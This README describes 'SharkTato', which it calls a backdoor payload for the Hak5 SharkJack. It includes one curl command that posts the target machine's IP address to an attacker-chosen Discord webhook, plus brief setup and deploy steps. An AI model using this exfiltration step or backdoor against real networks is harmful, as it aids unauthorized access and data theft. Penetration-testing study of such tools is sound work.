# SharkTato
> Chris Taylor [Blue Cosmo] | 04/08/22
---

```
  _________.__                  __   ___________       __          
 /   _____/|  |__ _____ _______|  | _\__    ___/____ _/  |_  ____  
 \_____  \ |  |  \\__  \\_  __ \  |/ / |    |  \__  \\   __\/  _ \ 
 /        \|   Y  \/ __ \|  | \/    <  |    |   / __ \|  | (  <_> )
/_______  /|___|  (____  /__|  |__|_ \ |____|  (____  /__|  \____/ 
        \/      \/     \/           \/              \/             
```

## Overview:
SharkTato is a backdoor for the Hak5 [SharkJack](https://shop.hak5.org/products/shark-jack?variant=21284894670961). It uses Discord Webhooks to send us back the IP address of our target machine. Huge shoutout to AndreMtl514 for the support!

## Resources:
- [YouTube Video](https://www.youtube.com/watch?v=O37hJrCELpk)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Discord
- SharkJack

## Instructions:
1. Change line 24 in `payload.sh` from `DISCORDWEBHOOK` to a discord webhook you generate
```
curl -F "payload_json={\"username\": \"Tremor\", \"content\": \""$ADDRESS"\"}" DISCORDWEBHOOK
```
2. Deploy
